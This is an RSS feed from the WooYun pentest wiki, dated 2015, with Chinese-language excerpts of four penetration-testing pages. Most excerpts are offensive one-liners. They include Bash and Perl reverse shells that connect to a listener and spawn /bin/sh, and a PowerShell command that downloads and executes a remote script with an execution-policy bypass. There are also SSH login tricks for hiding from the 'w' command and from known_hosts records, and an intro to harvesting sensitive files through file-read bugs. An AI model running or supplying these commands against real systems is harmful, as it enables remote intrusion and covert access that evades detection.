<?xml version="1.0" encoding="utf-8"?>
<!-- generator="FeedCreator 1.7.2-ppt DokuWiki" -->
<?xml-stylesheet href="http://wiki.wooyun.org/lib/exe/css.php?s=feed" type="text/css"?>
<rdf:RDF
    xmlns="http://purl.org/rss/1.0/"
    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
    xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
    xmlns:dc="http://purl.org/dc/elements/1.1/">
    <channel rdf:about="http://wiki.wooyun.org/feed.php">
        <title>WooYun WiKi pentest</title>
        <description></description>
        <link>http://wiki.wooyun.org/</link>
        <image rdf:resource="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/favicon.ico" />
       <dc:date>2015-12-04T11:01:45+08:00</dc:date>
        <items>
            <rdf:Seq>
                <rdf:li rdf:resource="http://wiki.wooyun.org/pentest:%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9shell?rev=1439895401&amp;do=diff"/>
                <rdf:li rdf:resource="http://wiki.wooyun.org/pentest:filepath?rev=1437672424&amp;do=diff"/>
                <rdf:li rdf:resource="http://wiki.wooyun.org/pentest:powershell?rev=1437672424&amp;do=diff"/>
                <rdf:li rdf:resource="http://wiki.wooyun.org/pentest:ssh%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C?rev=1437672424&amp;do=diff"/>
            </rdf:Seq>
        </items>
    </channel>
    <image rdf:about="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/favicon.ico">
        <title>WooYun WiKi</title>
        <link>http://wiki.wooyun.org/</link>
        <url>http://wiki.wooyun.org/lib/tpl/bootstrap3/images/favicon.ico</url>
    </image>
    <item rdf:about="http://wiki.wooyun.org/pentest:%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9shell?rev=1439895401&amp;do=diff">
        <dc:format>text/html</dc:format>
        <dc:date>2015-08-18T18:56:41+08:00</dc:date>
        <title>pentest:各种语言一句话反弹shell</title>
        <link>http://wiki.wooyun.org/pentest:%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9shell?rev=1439895401&amp;do=diff</link>
        <description>Bash [不通用，跟linux发行版本有关，在ubuntu上测试成功]


bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1


PERL


perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'</description>
    </item>
    <item rdf:about="http://wiki.wooyun.org/pentest:filepath?rev=1437672424&amp;do=diff">
        <dc:format>text/html</dc:format>
        <dc:date>2015-07-24T01:27:04+08:00</dc:date>
        <title>pentest:filepath</title>
        <link>http://wiki.wooyun.org/pentest:filepath?rev=1437672424&amp;do=diff</link>
        <description>文件读取漏洞路径收集

代码在做渗透测试当中会在某些情况可以读取系统文件，例如MySQL注入当中利用load_file函数读取系统文件，或者服务器配置不当参考：新型任意文件读取漏洞的研究

这里收集一下服务器通常存在的文件，可以通过读取相关敏感文件达到快速获取信息的目的。</description>
    </item>
    <item rdf:about="http://wiki.wooyun.org/pentest:powershell?rev=1437672424&amp;do=diff">
        <dc:format>text/html</dc:format>
        <dc:date>2015-07-24T01:27:04+08:00</dc:date>
        <title>pentest:powershell</title>
        <link>http://wiki.wooyun.org/pentest:powershell?rev=1437672424&amp;do=diff</link>
        <description>1.通过远程下载来执行


Set-ExecutionPolicy RemoteSigned
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')


2.把ps脚本传到本地后执行


PowerShell.exe -ep Bypass -File d:\powercat.ps1</description>
    </item>
    <item rdf:about="http://wiki.wooyun.org/pentest:ssh%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C?rev=1437672424&amp;do=diff">
        <dc:format>text/html</dc:format>
        <dc:date>2015-07-24T01:27:04+08:00</dc:date>
        <title>pentest:ssh相关操作</title>
        <link>http://wiki.wooyun.org/pentest:ssh%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C?rev=1437672424&amp;do=diff</link>
        <description>我一般先这么登录，不让对方执行w的时候看到我


ssh -T root@8.8.8.8 bin/sh -i


还有一个技巧：远程登录时防止被记录到knowhosts文件（默认为~/.ssh/knowhosts）


ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i</description>
    </item>
</rdf:RDF>
